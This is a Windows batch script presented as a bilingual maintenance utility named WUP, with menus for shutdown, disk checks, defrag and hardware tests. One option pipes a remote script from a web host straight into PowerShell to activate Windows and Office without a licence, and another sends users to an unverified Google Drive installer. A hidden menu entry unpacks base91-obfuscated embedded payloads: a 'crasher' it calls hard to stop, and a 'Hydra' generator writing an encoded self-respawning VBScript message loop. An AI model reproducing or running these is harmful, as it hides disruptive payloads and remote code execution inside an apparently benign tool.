@chcp 65001
@echo off
title W U P
color a


:INICIO
cls
echo.
set /a cagando=(%random%*3/32768)+0
timeout /t %cagando% >nul
echo.      ██╗    ██╗     ██╗   ██╗     ██████╗ 
set /a cagando=(%random%*3/32768)+0 
timeout /t %cagando% >nul
echo.      ██║    ██║     ██║   ██║     ██╔══██╗
set /a cagando=(%random%*3/32768)+0
timeout /t %cagando% >nul
echo.      ██║ █╗ ██║     ██║   ██║     ██████╔╝
set /a cagando=(%random%*3/32768)+0
timeout /t %cagando% >nul
echo.      ██║███╗██║     ██║   ██║     ██╔═══╝ 
set /a cagando=(%random%*3/32768)+0
timeout /t %cagando% >nul
echo.      ╚███╔███╔╝     ╚██████╔╝     ██║ 
set /a cagando=(%random%*3/32768)+0  
timeout /t %cagando% >nul
echo.       ╚══╝╚══╝indows ╚═════╝tility╚═╝rogram
timeout /t 2 >nul   
echo. 
echo.            v2.0 created by Javi3rV
echo.

echo choose your language:
echo.
echo. 1) English
echo. 2) Español
echo.
set /p answer=WUP:

if "%answer%"=="0" cls & goto DarkWUP
if "%answer%"=="1" set menueseng=MENUENG & goto MENUENG
if "%answer%"=="2" set menueseng=MENUESP & goto MENUESP

echo.
echo That number is not in the list! -- Ese número no está en la lista
pause
goto INICIO2


:INICIO2
@chcp 65001
cls
echo.
echo.      ██╗    ██╗    ██╗   ██╗    ██████╗ 
echo.      ██║    ██║    ██║   ██║    ██╔══██╗
echo.      ██║ █╗ ██║    ██║   ██║    ██████╔╝
echo.      ██║███╗██║    ██║   ██║    ██╔═══╝ 
echo.      ╚███╔███╔╝    ╚██████╔╝    ██║     
echo.       ╚══╝╚══╝      ╚═════╝     ╚═╝     
echo.          v2.0 created by Javi3rV
echo.
echo choose your language:
echo.
echo. 1) English
echo. 2) Español
echo.
set /p answer=WUP:

if "%answer%"=="0" cls & goto DarkWUP
if "%answer%"=="1" set menueseng=MENUENG & goto MENUENG
if "%answer%"=="2" set menueseng=MENUESP & goto MENUESP

echo.
echo That number is not in the list! -- Ese número no está en la lista
pause
goto INICIO2

:MENUENG
@chcp 65001
cls
echo.
echo.      ██╗    ██╗    ██╗   ██╗    ██████╗ 
echo.      ██║    ██║    ██║   ██║    ██╔══██╗
echo.      ██║ █╗ ██║    ██║   ██║    ██████╔╝
echo.      ██║███╗██║    ██║   ██║    ██╔═══╝ 
echo.      ╚███╔███╔╝    ╚██████╔╝    ██║     
echo.       ╚══╝╚══╝      ╚═════╝     ╚═╝     
echo.          v2.0 created by Javi3rV
echo.

echo select your preferred option [1-8]
echo.
echo. 1 -- Reboot Windows Explorer
echo. 2 -- Shutdown
echo. 3 -- Show ip information
echo. 4 -- Hard Disk maintenance
echo. 5 -- Hardware test 
echo. 6 -- Activate Windwos + Office
echo. 7 -- Download Office 2019 installer
echo. 8 -- Exit

echo. 
set /p answer=WUP:

if "%answer%"=="0" cls & goto DarkWUP
if "%answer%"=="1" cls & echo. & echo If you want to cancel this task, close this window without presing any key. & echo. & echo Thanks for using WUP & goto OP1
if "%answer%"=="2" cls & echo. & goto OP2ENG
if "%answer%"=="3" cls & echo. & echo Thanks for using WUP & goto OP3
if "%answer%"=="4" cls & goto OP4ENG
if "%answer%"=="5" cls & goto OP5ENG 
if "%answer%"=="6" cls & goto Activadores
if "%answer%"=="7" cls & echo. & echo. Opening your browser... & timeout /t 4 /nobreak >nul & start https://drive.google.com/file/d/1qTz2OuQTWyUTxdhBGODhZOW6k-7w7upQ/view?usp=sharing & goto MENUENG
if "%answer%"=="8" cls & echo. & echo Thanks for using WUP & pause & exit
echo.
echo That number is not in the list!
pause
goto MENUENG


:MENUESP
@chcp 65001
cls
echo.
echo.      ██╗    ██╗    ██╗   ██╗    ██████╗ 
echo.      ██║    ██║    ██║   ██║    ██╔══██╗
echo.      ██║ █╗ ██║    ██║   ██║    ██████╔╝
echo.      ██║███╗██║    ██║   ██║    ██╔═══╝ 
echo.      ╚███╔███╔╝    ╚██████╔╝    ██║    
echo.       ╚══╝╚══╝      ╚═════╝     ╚═╝     
echo.          v2.0 created by Javi3rV
echo.

echo Seleccione la función que necesite [1-8]
echo.
echo. 1 -- Reiniciar explorador de Windows
echo. 2 -- Apagar pc
echo. 3 -- Información de ip
echo. 4 -- Mantenimiento del disco duro
echo. 5 -- Testeo de hardware
echo. 6 -- Activar Windows + Office
echo. 7 -- Descargar instalador de office 2019
echo. 8 -- Salir

echo. 
set /p answer=WUP:

if "%answer%"=="0" cls & goto DarkWUP
if "%answer%"=="1" cls & echo. & echo si desea cancelar esta acción, cierre esta ventana sin pulsar ninguna tecla. & echo. & echo Gracias por usar WUP & goto OP1
if "%answer%"=="2" cls & echo. & goto OP2ESP
if "%answer%"=="3" cls & echo. & echo Gracias por usar WUP & goto OP3
if "%answer%"=="4" cls & goto OP4ESP
if "%answer%"=="5" cls & goto OP5ESP
if "%answer%"=="6" cls & goto Activadores
if "%answer%"=="7" cls & echo. & echo Abriendo el navegador... & timeout /t 4 /nobreak >nul & start https://drive.google.com/file/d/1qTz2OuQTWyUTxdhBGODhZOW6k-7w7upQ/view?usp=sharing & goto MENUESP
if "%answer%"=="8" cls & echo. & echo Gracias por usar WUP & exit
echo.
echo Ese número no está en la lista
pause
goto MENUESP


:OP1
echo.
pause
taskkill /IM explorer.exe /F
start explorer.exe
cls
goto INICIO


:OP2ESP
echo.
echo Como desea apagar el ordenador?
echo.
echo. 1 -- Apagar ahora
echo. 2 -- Programar apagado
echo. 3 -- Atrás
echo.
set /p answer=WUP:
if "%answer%"=="1" cls & shutdown -s -t 5 -c "Apagando en 5 segundos. Gracias por usar WUP." & exit
if "%answer%"=="2" cls & goto DOWNTEMPESP
if "%answer%"=="3" cls & goto MENUESP


:OP2ENG
echo.
echo How would you like to shutdown?
echo.
echo. 1 -- Shutdown now
echo. 2 -- Set a countdown
echo. 3 -- Go back
echo.
set /p answer=WUP:
if "%answer%"=="1" cls & shutdown -s -t 5 -c "Shutting down in 5 seconds. Thanks for using WUP." & exit
if "%answer%"=="2" cls & goto DOWNTEMPENG
if "%answer%"=="3" cls & goto MENUENG


:DOWNTEMPESP
echo.
echo Indica el tiempo de cuenta atrás (en segundos)
set /p answer=WUP:

shutdown -s -t %answer% -c "Apagando en %answer% segundos. Gracias por usar WUP"
goto MENUESP


:DOWNTEMPENG
echo.
echo Set the countdown (seconds)
set /p answer=WUP:

shutdown -s -t %answer% -c "Shutting down in %answer% seconds. Thanks for using WUP"
goto MENUENG


:OP3
pause
ipconfig /all
pause
goto %menueseng%


:OP4ESP
echo.
echo ¿Qué desea hacer?
echo.
echo 1 -- Solo revisar
echo 2 -- Revisar y reparar (solo si la opcion 1 indica que hay acciones necesarias)
echo 3 -- Desfragmentar 
echo 4 -- Optimizar SSD
echo 5 -- Atras
echo.
set /p answer=WUP:
if "%answer%"=="1" cls & echo. & echo Introduce el nombre del disco que desea revisar y pulsa enter & goto CHECKEARESP
if "%answer%"=="2" cls & echo. & echo. & echo Introduce el nombre del disco que desea revisar y reparar y pulsa enter & goto CHCKREPARARESP
if "%answer%"=="3" cls & echo. & goto DEFRAGESP 
if "%answer%"=="4" cls & echo. & goto SSDEFRAGESP
if "%answer%"=="5" cls & goto MENUESP


:CHECKEARESP
set /p answer=WUP:
cls
echo.
echo Gracias por usar WUP
echo.
pause
chkdsk %answer%
echo.
pause
goto MENUESP


:CHCKREPARARESP
set /p answer=WUP:
cls
echo.
echo Gracias por usar WUP
echo.
echo. NOTA: Si dice que otro proceso esta usando el disco y no te permite continuar
echo.       programalo para que se ejecute al reiniciar.
echo.
pause
chkdsk /F %answer%
echo.
pause
goto MENUESP

:DEFRAGESP 
echo.
echo Indica el disco a desfragmentar (por ejemplo: C:)
echo.
set /p disco=WUP:
echo.
cls
echo.
echo Antes de desfragmentar, se hará un análisis para ver si es necesario.
timeout /t 5 /nobreak >nul
defrag %disco% /a
echo.
echo ¿Necesita desfragmentarlo? (si/no)
set /p answer=WUP:
if "%answer%"=="si" cls & defrag %disco% & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="Si" cls & defrag %disco% & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="SI" cls & defrag %disco% & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="sI" cls & defrag %disco% & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="no" cls & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="nO" cls & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="NO" cls & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="No" cls & echo. & echo Gracias por usar WUP & pause & goto MENUESP
echo No te entiendo
timeout /t 3
cls
goto DEFRAGESP
:SSDEFRAGESP
echo. Indique el SSD a optimizar (por ejemplo: C:)
echo.
set /p disco=WUP:
defrag %disco% /L
echo.
echo Gracias por usar WUP
pause
goto MENUESP

:OP4ENG
echo.
echo Choose your check mode
echo.
echo 1 -- Only check
echo 2 -- Check and repair (if option 1 showed actions required)
echo 3 -- Defrag
echo 4 -- Optimize SSD
echo 5 -- Go back
echo.
set /p answer=WUP:
if "%answer%"=="1" cls & echo. & echo Write the disc letter to check and press enter & goto CHECKEARENG
if "%answer%"=="2" cls & echo. & echo. & echo Write the disc letter to check and press enter & goto CHCKREPARARENG
if "%answer%"=="3" cls & echo. & goto DEFRAGENG
if "%answer%"=="4" cls & echo. & goto SSDEFRAGENG
if "%answer%"=="5" cls & goto MENUENG


:CHECKEARENG
set /p answer=WUP:
cls
echo.
echo Thanks for using WUP
echo.
pause
chkdsk %answer%
echo.
pause
goto MENUENG


:DEFRAGENG
echo.
echo Set disk to defrag (for example: C:)
echo.
set /p disco=WUP:
echo.
cls
echo.
echo Before the defrag process, an analysis will be done to see if defrag is necessary.
timeout /t 5 /nobreak >nul
defrag %disco% /a
echo.
echo Do you want to defrag? (yes/no)
set /p answer=WUP:
if "%answer%"=="yes" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="Yes" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="yEs" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="YES" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="yeS" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="YeS" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="yES" cls & defrag %disco% & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="no" cls & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="NO" cls & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="No" cls & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="nO" cls & echo. & echo Thanks for using WUP & pause & goto MENUENG
echo I didn't understand you
timeout /t 3
cls
goto DEFRAGENG
:SSDEFRAGENG
echo. Set SSD to optimize (for example: C:)
echo.
set /p disco=WUP:
defrag %disco% /L 
echo.
echo Thanks for using WUP
pause
goto MENUENG


:CHCKREPARARENG
set /p answer=WUP:
cls
echo.
echo Thanks for using WUP
echo.
echo. NOTE: If you get an error like "another process is using that disk" choose "Yes" when it ask you to program it to check
echo.       on reboot.
echo.
pause
chkdsk /F %answer%
echo.
pause
goto MENUENG

:OP5ENG
echo.
echo Select hardware to test
echo.
echo. 1 -- CPU
echo. 2 -- Graphics
echo. 3 -- RAM
echo. 4 -- Hard disk
echo. 5 -- All (this may take a while)
echo. 6 -- back
echo.
set /p answer=WUP:
if "%answer%"=="1" cls & winsat CPUformal & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="2" cls & winsat GRAPHICSformal & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="3" cls & winsat MEMformal & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="4" cls & winsat DISKformal & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="5" cls & winsat formal & echo. & echo Thanks for using WUP & pause & goto MENUENG
if "%answer%"=="6" cls & goto MENUENG


:OP5ESP
echo.
echo Selecciona el hardware para testear
echo.
echo. 1 -- CPU
echo. 2 -- Gráficos
echo. 3 -- RAM
echo. 4 -- Disco Duro
echo. 5 -- Todos (esto puede tardar un rato)
echo. 6 -- Atrás
echo.
set /p answer=WUP:
if "%answer%"=="1" cls & winsat CPUformal & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="2" cls & winsat GRAPHICSformal & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="3" cls & winsat MEMformal & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="4" cls & winsat DISKformal & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="5" cls & winsat formal & echo. & echo Gracias por usar WUP & pause & goto MENUESP
if "%answer%"=="6" cls & goto MENUESP


:darkWUP


@echo off
title Dark W U P
color a
@chcp 65001
cls

echo.
echo.              ░                  ▓
echo.       █     █░    █    ██     ██▓███  
echo.      ▓█░ █ ░█░    ██  ▓██▒   ▓██░  ██▒
echo.      ▒█░ █ ░█    ▓██  ▒██░   ▓██░ ██▓▒
echo.      ░█░ █ ░█    ▓▓█  ░██░   ▒██▄█▓▒ ▒
echo.      ░░██▒██░    ▒▒█████▓    ▒██▒ ░  ░
echo.      ░ ▓░▒ ▒     ░▒▓▒ ▒ ▒    ▒▓▒░ ░  ░
echo.        ▒ ░ ░▓    ░░▒░ ░ ░    ░▒ ░     
echo.        ░   ░      ░░░ ░ ░    ░░       
echo.          ░          ░                 
echo.           v1.5 created by Javi3rV
echo.
echo.
echo.     Choose language
echo.
echo.   1 -- English
echo.   2 -- Español
echo.
set /p answer=DWUP:
if "%answer%"=="1" set menueseng=MENUENG & goto DMENUENG
if "%answer%"=="2" set menueseng=MENUESP & goto DMENUESP

echo. That number is not in the list
goto darkWUP

:DMENUENG
@chcp 65001
cls
echo.
echo.              ░                  ▓
echo.       █     █░    █    ██     ██▓███  
echo.      ▓█░ █ ░█░    ██  ▓██▒   ▓██░  ██▒
echo.      ▒█░ █ ░█    ▓██  ▒██░   ▓██░ ██▓▒
echo.      ░█░ █ ░█    ▓▓█  ░██░   ▒██▄█▓▒ ▒
echo.      ░░██▒██░    ▒▒█████▓    ▒██▒ ░  ░
echo.      ░ ▓░▒ ▒     ░▒▓▒ ▒ ▒    ▒▓▒░ ░  ░
echo.        ▒ ░ ░▓    ░░▒░ ░ ░    ░▒ ░     
echo.        ░   ░      ░░░ ░ ░    ░░       
echo.          ░          ░                 
echo.           v1.7 created by Javi3rV
echo.
echo.
echo.     Choose option [1-3]
echo.
echo.   1 -- Fun (fake virus generator)
echo.   2 -- Exit
echo.
set /p answer=DWUP:
if "%answer%"=="1" goto FUNENG
if "%answer%"=="2" exit

echo That number is not in the list
goto DMENUENG

:DMENUESP
@chcp 65001
cls
echo.
echo.              ░                  ▓
echo.       █     █░    █    ██     ██▓███  
echo.      ▓█░ █ ░█░    ██  ▓██▒   ▓██░  ██▒
echo.      ▒█░ █ ░█    ▓██  ▒██░   ▓██░ ██▓▒
echo.      ░█░ █ ░█    ▓▓█  ░██░   ▒██▄█▓▒ ▒
echo.      ░░██▒██░    ▒▒█████▓    ▒██▒ ░  ░
echo.      ░ ▓░▒ ▒     ░▒▓▒ ▒ ▒    ▒▓▒░ ░  ░
echo.        ▒ ░ ░▓    ░░▒░ ░ ░    ░▒ ░     
echo.        ░   ░      ░░░ ░ ░    ░░       
echo.          ░          ░                 
echo.           v1.7 created by Javi3rV
echo.
echo.
echo.     Elige opción [1-3]
echo.
echo.   1 -- Diversion (generador de virus falso)
echo.   2 -- salir
echo.
set /p answer=DWUP:
if "%answer%"=="1" goto FUNESP
if "%answer%"=="2" exit
echo.
echo Ese numero no esta en la lista
goto DMENUESP

:FUNESP
cls
echo.
echo.              ░                  ▓
echo.       █     █░    █    ██     ██▓███  
echo.      ▓█░ █ ░█░    ██  ▓██▒   ▓██░  ██▒
echo.      ▒█░ █ ░█    ▓██  ▒██░   ▓██░ ██▓▒
echo.      ░█░ █ ░█    ▓▓█  ░██░   ▒██▄█▓▒ ▒
echo.      ░░██▒██░    ▒▒█████▓    ▒██▒ ░  ░
echo.      ░ ▓░▒ ▒     ░▒▓▒ ▒ ▒    ▒▓▒░ ░  ░
echo.        ▒ ░ ░▓    ░░▒░ ░ ░    ░▒ ░     
echo.        ░   ░      ░░░ ░ ░    ░░       
echo.          ░          ░                 
echo.           v1.7 created by Javi3rV
echo.
echo.
echo.     Elige opción [1-3]
echo.
echo.   1 -- Hydra
echo.   2 -- crasher (cuidado con este virus, es dificil de parar)
echo.   3 -- salir
echo.
set /p answer=DWUP:
if "%answer%"=="1" goto HYESP
if "%answer%"=="2" goto CRSHR
if "%answer%"=="3" exit
echo.
echo Ese numero no esta en la lista
goto FUNESP

:FUNENG
cls
echo.
echo.              ░                  ▓
echo.       █     █░    █    ██     ██▓███  
echo.      ▓█░ █ ░█░    ██  ▓██▒   ▓██░  ██▒
echo.      ▒█░ █ ░█    ▓██  ▒██░   ▓██░ ██▓▒
echo.      ░█░ █ ░█    ▓▓█  ░██░   ▒██▄█▓▒ ▒
echo.      ░░██▒██░    ▒▒█████▓    ▒██▒ ░  ░
echo.      ░ ▓░▒ ▒     ░▒▓▒ ▒ ▒    ▒▓▒░ ░  ░
echo.        ▒ ░ ░▓    ░░▒░ ░ ░    ░▒ ░     
echo.        ░   ░      ░░░ ░ ░    ░░       
echo.          ░          ░                 
echo.           v1.7 created by Javi3rV
echo.
echo.
echo.     Choose option [1-3]
echo.
echo.   1 -- Hydra
echo.   2 -- crasher (be careful with this virus, it is hard to stop)
echo.   3 -- exit
echo.
set /p answer=DWUP:
if "%answer%"=="1" goto HYENG
if "%answer%"=="2" cls & goto CRSHR
if "%answer%"=="3" exit
echo.
echo That number is not in the list
goto FUNENG

:CRSHR
cd /D %~dp0
chcp 850 >nul
@set "0=%~f0" &powershell -nop -c $f=[IO.File]::ReadAllText($env:0)-split':crash3r\:.*';iex($f[1]); X(1) >nul & cls & goto continue

:crash3r: Compressed2TXT v6.3
$k='.,;{-}[+](/)_|^=?O123456789ABCDeFGHyIdJKLMoN0PQRSTYUWXVZabcfghijklmnpqrstuvwxz!@#$&~E<*`%\>'; Add-Type -Ty @'
using System.IO;public class BAT91{public static void Dec(ref string[] f,int x,string fo,string key){unchecked{int n=0,c=255,q=0
,v=91,z=f[x].Length; byte[]b91=new byte[256]; while(c>0) b91[c--]=91; while(c<91) b91[key[c]]=(byte)c++; using (FileStream o=new
FileStream(fo,FileMode.Create)){for(int i=0;i!=z;i++){c=b91[f[x][i]]; if(c==91)continue; if(v==91){v=c;}else{v+=c*91;q|=v<<n;if(
(v&8191)>88){n+=13;}else{n+=14;}v=91;do{o.WriteByte((byte)q);q>>=8;n-=8;}while(n>7);}}if(v!=91)o.WriteByte((byte)(q|v<<n));} }}}
'@; cd -Lit($env:__CD__); function X([int]$x=1){[BAT91]::Dec([ref]$f,$x+1,$x,$k); expand -R $x -F:* .; del $x -force}

:crash3r:[ crash3r_bat
::AVEYO...,Pn.......N=........z;].F...$hl...t...?./;l)+,........JQ=swZF.!97Hr6STgFs+o3g_H+@=}}.S,kv;#7Q5.7_.L]7a;_.._p!!?b_nr!nY^7!6/fV{A2xZ*DxRI*GR.jl,4\@?,>w;_.`)..ef_.4|$,$L.jsaw%>--cpF)QrMm1F[csm(;KQ[Kdp[G)K6]d?`Z%_8y5;>..W.,P[>~Y=N7*V5,r`DCpk|O`lHaxZ{r5=r*\vRpZk8sPT#Ff4g`ivP>^(O%,wk\IRmUavf_(Law(^5@&ren5I|9)nB/|uMWa@xk677nilp*-!O}hzX6y8)%tlV<A(E`#>Bwa,-|?E/GigW}G}1}HMB.C?ohmE;,TB*S*0Y/?{oh(3&}\={(`@46j{BxlG1M,(C;|p>aD\_Iv,%b?JMddbniMV]_WdjE&8#daM,L5T33f\K[;XJ{IKZxp#\T8ryu1$Di3+!j%^CuY4U3;(fe^F`)&!E<KR5)R/e7|~>_?7gcRCFXqtW[&x5|&o)O)zS\*<=~3fVvvUuoeBHb_Ine-3Ym&4S<NTJYB[JFaiKFyp(66THe@yS?*=h{gq*d,B*dHTDme@O6kqj;z&SSe_^N1ABMXwm[gn=|t3CS)DlQBK-$wLZOD5...
:crash3r:]
:continue
echo. [crash3r] Extracted to the same folder as WUP / extraido al mismo directorio que WUP:
echo. %~dp0
echo.
echo. You can change its name if you want / Le puedes cambiar el nombre si quieres
pause
exit
:HYESP
cls
chcp 850 >nul
cd %temp% >nul
@set "0=%~f0" &powershell -nop -c $f=[IO.File]::ReadAllText($env:0)-split':fuunesp\:.*';iex($f[1]); X(1) >nul & cls & goto creatoresp

:fuunesp: Compressed2TXT v6.3
$k='.,;{-}[+](/)_|^=?O123456789ABCDeFGHyIdJKLMoN0PQRSTYUWXVZabcfghijklmnpqrstuvwxz!@#$&~E<*`%\>'; Add-Type -Ty @'
using System.IO;public class BAT91{public static void Dec(ref string[] f,int x,string fo,string key){unchecked{int n=0,c=255,q=0
,v=91,z=f[x].Length; byte[]b91=new byte[256]; while(c>0) b91[c--]=91; while(c<91) b91[key[c]]=(byte)c++; using (FileStream o=new
FileStream(fo,FileMode.Create)){for(int i=0;i!=z;i++){c=b91[f[x][i]]; if(c==91)continue; if(v==91){v=c;}else{v+=c*91;q|=v<<n;if(
(v&8191)>88){n+=13;}else{n+=14;}v=91;do{o.WriteByte((byte)q);q>>=8;n-=8;}while(n>7);}}if(v!=91)o.WriteByte((byte)(q|v<<n));} }}}
'@; cd -Lit($env:__CD__); function X([int]$x=1){[BAT91]::Dec([ref]$f,$x+1,$x,$k); expand -R $x -F:* .; del $x -force} 
:fuunesp:[ ENCODERR
::AVEYO...7ac.......N=........z;].F...yK2,..s,..k.L]z,%,........r!L^#TK,77A(%[lS}|5h+l_~BypU]T5qS;KAq60TR.<{.-OPY,~6Ne..S.~6U.ns87
::!m<e\rqb!]yCY+PPv8h,8H^X~j_u)~42d\^`j`L}{e..6O..I7,PSpB?A|b@B^%xXQ2h}hHSGcZVuRks+U8?|A|DU!!*g\x\E\,P....Q5..tn*Tefe%d]A0m(B6&|@D
::a+bv5{T\`YV]gRZtX|4A}W44&aX*|@(}NWHoMA3Tcd};e2W0!~qta,N2U_t^am#3~ZNX>.f-L(WWI7_7~k9w`IQ-\f&!lk[E%&MwBKs-@u*L<-]?+)/7USq)ZztZ^?/]
::6/B++$~nX|]5[bY*f]Czg@s%|Pr@0*Z)yIiw_IxbI[dUQM]~tO^U;]n?8YvdJn1)9<7vVaeG,j$y/26X3WYh~b;O$w(r$8N2\L1MqL=NMs]D(B;#)W7k~^au<s\yO?$%
::X[j`pj>qyy~#A#<rWb6\=l84.#3UULO=S#0<J(BrY)(yJE~PD-tf6IfwQwfY2
:fuunesp:] 

:creatoresp

cd %temp%\ENCODERR

echo.
echo. Introduce el nombre del virus troll (elige bien, si lo cambias despues de generarlo, no funcionara): 
echo.
set /p answer=WUP:
echo.
echo. generando script...
timeout /t 5 /nobreak >nul
echo do >>%answer%.vbs
echo msgbox "Juguemos a un juego, corta una cabeza y dos la sustituiran",0,"Hydra" >>%answer%.vbs
echo Set WshShell = CreateObject("WScript.Shell") >>%answer%.vbs
echo WshShell.Run """%answer%.vbe""", 0 >>%answer%.vbs
echo Set WshShell = Nothing >>%answer%.vbs 
echo loop >>%answer%.vbs

start Encoder.vbs %answer%.vbs

echo.
echo. encriptando resultado...
timeout /t 10 /nobreak >nul
move %answer%.vbe %~dp0 >nul
timeout /t 2 /nobreak >nul


echo.
echo. eliminando archivos residuales...
cd /D %~dp0
timeout /t 1 /nobreak >nul
rd /S /Q %temp%\ENCODERR\
timeout /t 3 /nobreak >nul

echo.
echo. Virus falso movido al mismo directorio del WUP: %~dp0
echo.
echo. Para acabar con este "virus" hay que finalizar las tareas "Microsoft Windows Based Script Host" con el admin. de tareas o preguntar al desarrollador por el HydraStopper.
pause
cd /D %SYSTEMROOT%\system32
goto DMENUESP

:HYENG
cls
chcp 850 >nul
cd %temp% >nul
@set "0=%~f0" &powershell -nop -c $f=[IO.File]::ReadAllText($env:0)-split':fuuneng\:.*';iex($f[1]); X(1) >nul & cls & goto creatoreng

:fuuneng: Compressed2TXT v6.3
$k='.,;{-}[+](/)_|^=?O123456789ABCDeFGHyIdJKLMoN0PQRSTYUWXVZabcfghijklmnpqrstuvwxz!@#$&~E<*`%\>'; Add-Type -Ty @'
using System.IO;public class BAT91{public static void Dec(ref string[] f,int x,string fo,string key){unchecked{int n=0,c=255,q=0
,v=91,z=f[x].Length; byte[]b91=new byte[256]; while(c>0) b91[c--]=91; while(c<91) b91[key[c]]=(byte)c++; using (FileStream o=new
FileStream(fo,FileMode.Create)){for(int i=0;i!=z;i++){c=b91[f[x][i]]; if(c==91)continue; if(v==91){v=c;}else{v+=c*91;q|=v<<n;if(
(v&8191)>88){n+=13;}else{n+=14;}v=91;do{o.WriteByte((byte)q);q>>=8;n-=8;}while(n>7);}}if(v!=91)o.WriteByte((byte)(q|v<<n));} }}}
'@; cd -Lit($env:__CD__); function X([int]$x=1){[BAT91]::Dec([ref]$f,$x+1,$x,$k); expand -R $x -F:* .; del $x -force} 
:fuuneng:[ ENCODERR
::AVEYO...7ac.......N=........z;].F...yK2,..s,..k.L]z,%,........r!L^#TK,77A(%[lS}|5h+l_~BypU]T5qS;KAq60TR.<{.-OPY,~6Ne..S.~6U.ns87
::!m<e\rqb!]yCY+PPv8h,8H^X~j_u)~42d\^`j`L}{e..6O..I7,PSpB?A|b@B^%xXQ2h}hHSGcZVuRks+U8?|A|DU!!*g\x\E\,P....Q5..tn*Tefe%d]A0m(B6&|@D
::a+bv5{T\`YV]gRZtX|4A}W44&aX*|@(}NWHoMA3Tcd};e2W0!~qta,N2U_t^am#3~ZNX>.f-L(WWI7_7~k9w`IQ-\f&!lk[E%&MwBKs-@u*L<-]?+)/7USq)ZztZ^?/]
::6/B++$~nX|]5[bY*f]Czg@s%|Pr@0*Z)yIiw_IxbI[dUQM]~tO^U;]n?8YvdJn1)9<7vVaeG,j$y/26X3WYh~b;O$w(r$8N2\L1MqL=NMs]D(B;#)W7k~^au<s\yO?$%
::X[j`pj>qyy~#A#<rWb6\=l84.#3UULO=S#0<J(BrY)(yJE~PD-tf6IfwQwfY2
:fuuneng:] 

:creatoreng

cd %temp%\ENCODERR

echo.
echo. Enter name for your virus (choose well, if you change it after generating, it will not work correctly):
echo.
set /p answer=WUP:
echo.
echo. generating script...
timeout /t 5 /nobreak >nul
echo do >>%answer%.vbs
echo msgbox "Let's play a game, cut one head and two will replace it",0,"Hydra" >>%answer%.vbs
echo Set WshShell = CreateObject("WScript.Shell") >>%answer%.vbs
echo WshShell.Run """%answer%.vbe""", 0 >>%answer%.vbs
echo Set WshShell = Nothing >>%answer%.vbs 
echo loop >>%answer%.vbs

start Encoder.vbs %answer%.vbs

echo.
echo. encripting output...
timeout /t 10 /nobreak >nul
move %answer%.vbe %~dp0 >nul
timeout /t 2 /nobreak >nul


echo.
echo. deleting residual files...
cd /D %~dp0
timeout /t 2 /nobreak >nul
rd /S /Q %temp%\ENCODERR
timeout /t 3 /nobreak >nul

echo.
echo. Fake virus stored at the same folder as WUP: %~dp0
echo.
echo. To stop this virus, you have to end "Microsoft Windows Based Script Host" tasks with the task manager.
pause
cd /D %SYSTEMROOT%\system32
goto DMENUENG

:Activadores

powershell -Command "irm https://get.activated.win | iex"
